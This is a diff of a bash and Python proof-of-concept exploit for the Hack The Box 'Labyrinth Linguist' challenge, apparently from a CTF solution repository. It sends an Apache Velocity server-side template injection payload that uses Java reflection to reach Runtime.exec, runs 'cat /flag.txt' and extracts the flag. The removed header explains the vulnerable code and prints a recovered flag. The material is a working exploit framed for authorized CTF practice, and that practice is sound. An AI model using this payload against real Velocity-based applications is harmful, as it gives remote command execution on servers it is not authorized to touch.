@@ -1,96 +1,153 @@
 #!/usr/bin/env bash
-
-# Challenge: Labyrinth Linguist
-# Platform: Hack The Box - CTF Try Out
-# Category: Web
-# Difficulty: Easy
-#
-# Scenario summary:
-# The application looks like a harmless "english to voxalith" translator, but the
-# backend is not actually translating text. Instead, it reads an HTML template file,
-# replaces the literal placeholder string TEXT with our input, and then feeds the
-# resulting page into Apache Velocity for template parsing.
-#
-# Why that matters:
-# If user-controlled input is inserted into a server-side template before the engine
-# parses it, then the user is no longer just sending text. The user is sending code
-# in that template language.
-#
-# In this challenge:
-# - The backend is Java / Spring.
-# - The template engine is Apache Velocity.
-# - Our input is inserted directly into the template body.
-# - That gives us Velocity SSTI.
-#
-# Relevant vulnerable logic from Main.java:
-#
-#   line = line.replace("TEXT", replacement);
-#   ...
-#   t.setData(runtimeServices.parse(reader, "home"));
-#   t.merge(context, writer);
-#
-# So the execution order is:
-#   1. Read template file.
-#   2. Replace TEXT with attacker-controlled input.
-#   3. Parse and execute the modified template.
-#
-# That means a payload like:
-#   #set($x=7*7)$x
-# becomes active Velocity code and renders 49.
-#
-# Real-world analogy:
-# Think of it like a CMS that lets users customize a page, but instead of storing the
-# text safely, it pastes that text straight into a server-side template compiler.
-# At that point, the "content" field becomes a programming interface.
-#
-# Exploit strategy:
-# 1. Confirm SSTI with a simple Velocity expression.
-# 2. Use Java reflection from Velocity to reach java.lang.Runtime.
-# 3. Run `cat /flag.txt`.
-# 4. Capture command output with java.util.Scanner and print it into the page.
-#
-# Why reflection is used:
-# Velocity gives us object and method access, but no direct shell helper.
-# Since Java strings expose .class / .getClass(), we can reach Class.forName(),
-# load Runtime, call getRuntime(), and then exec().
-#
-# Payload core:
-#   #set($x='')
-#   #set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
-#   #set($p=$rt.exec('cat /flag.txt'))
-#   #set($sc=$x.class.forName('java.util.Scanner')
-#       .getConstructor($x.class.forName('java.io.InputStream'))
-#       .newInstance($p.getInputStream())
-#       .useDelimiter('\\A'))
-#   $sc.next()
-#
-# Notes on the Scanner trick:
-# - Runtime.exec() gives back a Process.
-# - Process.getInputStream() exposes command stdout.
-# - Scanner(...).useDelimiter('\\A') reads the whole stream as one token.
-# - next() then returns the full command output as a single string.
-#
-# Usage:
-#   bash labyrinth_linguist_poc.sh
-#   bash labyrinth_linguist_poc.sh http://154.57.164.74:31332/
-#
-# Final flag recovered on this instance:
-# HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b28a4e5618d3b6f7e34ddc500f9f19fa}
-
 set -euo pipefail
 
-BASE_URL="${1:-http://154.57.164.74:31332/}"
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - Labyrinth Linguist
+# Type: Apache Velocity SSTI -> Java Runtime command execution
+#
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-python3 - "$BASE_URL" <<'PY'
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=20
+
+BASE_URL=""
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+JSON_OUTPUT=0
+VERBOSE=0
+
+usage() {
+  cat <<EOF
+Usage:
+  ${SCRIPT_NAME} <base_url>
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --base-url <url> [options]
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --base-url <url>      Target base URL (example: http://154.57.164.76:30854/)
+  --host <host>         Target host/IP
+  --port <port>         Target port
+  --timeout <seconds>   Request timeout in seconds (default: ${DEFAULT_TIMEOUT})
+  --json                Print result as JSON
+  --verbose             Enable verbose debug output
+  -h, --help            Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity/request failure
+  4  Flag not found in response
+EOF
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_ok() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[+] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+parse_args() {
+  local positional=()
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --base-url)
+        BASE_URL="${2:-}"
+        shift 2
+        ;;
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -*)
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${BASE_URL}" ]]; then
+    if [[ ${#positional[@]} -eq 1 ]]; then
+      BASE_URL="${positional[0]}"
+    elif [[ ${#positional[@]} -ge 2 ]]; then
+      HOST="${positional[0]}"
+      PORT="${positional[1]}"
+    fi
+  fi
+
+  if [[ -z "${BASE_URL}" ]]; then
+    if [[ -n "${HOST}" && -n "${PORT}" ]]; then
+      BASE_URL="http://${HOST}:${PORT}/"
+    fi
+  fi
+
+  if [[ -z "${BASE_URL}" ]]; then
+    log_error "Provide either base URL or host+port."
+    usage >&2
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+
+  log_info "Target: ${BASE_URL}"
+  log_info "Submitting Velocity SSTI payload..."
+
+  local result
+  if ! result="$(python3 - "$BASE_URL" "$TIMEOUT" "$VERBOSE" <<'PY'
 import re
 import sys
-
 import requests
 
 base = sys.argv[1].rstrip("/") + "/"
+timeout = float(sys.argv[2])
+verbose = sys.argv[3] == "1"
 
-# Step 1:
-# Build a Velocity SSTI payload that reaches Java Runtime through reflection.
 payload = (
     "#set($x='')"
     "#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())"
@@ -102,16 +159,46 @@ payload = (
     "$sc.next()"
 )
 
-# Step 2:
-# Submit the payload through the normal translation form.
-response = requests.post(base, data={"text": payload}, timeout=20)
-response.raise_for_status()
+try:
+    response = requests.post(base, data={"text": payload}, timeout=timeout)
+    response.raise_for_status()
+except requests.RequestException as exc:
+    print(f"ERR_REQUEST:{exc}")
+    raise SystemExit(3)
 
-# Step 3:
-# Extract the flag from the rendered HTML.
+if verbose:
+    print(f"DBG_STATUS:{response.status_code}")
+    print(f"DBG_URL:{response.url}")
+
 flag = re.search(r"HTB\{[^}]+\}", response.text)
 if not flag:
-    raise SystemExit("Flag not found in response")
+    print("ERR_NOFLAG:Flag not found in response")
+    raise SystemExit(4)
 
-print(flag.group(0))
+print(f"OK_FLAG:{flag.group(0)}")
 PY
+  )"; then
+    case "$?" in
+      3) log_error "Connectivity/request failure."; exit 3 ;;
+      4) log_error "Flag not found in response."; exit 4 ;;
+      *) log_error "Unexpected runtime failure."; exit 1 ;;
+    esac
+  fi
+
+  log_debug "Exploit output: ${result}"
+  local flag
+  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
+  if [[ -z "${flag}" ]]; then
+    log_error "No flag extracted from output."
+    exit 4
+  fi
+
+  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
+    printf '{"target":"%s","flag":"%s"}\n' "${BASE_URL}" "${flag}"
+  else
+    log_ok "Flag extracted successfully."
+    printf '%s\n' "${flag}"
+  fi
+}
+
+main "$@"
